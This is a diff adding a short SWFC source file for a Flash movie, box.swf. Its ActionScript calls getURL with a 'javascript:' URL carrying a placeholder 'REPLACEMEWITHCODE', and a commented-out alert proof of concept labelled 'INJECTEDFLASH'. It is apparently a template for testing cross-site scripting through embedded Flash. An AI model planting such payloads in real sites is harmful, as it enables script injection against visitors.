@@ -1,0 +1,11 @@
+.flash filename="box.swf"
+    .action:
+        //this.getURL("javascript:alert('INJECTEDFLASH "+y+" "+_root._url+" from '+document.location)","");
+        this.getURL("javascript:REPLACEMEWITHCODE","");
+        stop();
+    .end
+    .box b1 1 1 color=black
+    .put b1 pin=center scale=0%
+    .frame 100
+    .change b1 pin=center scale=100%
+.end
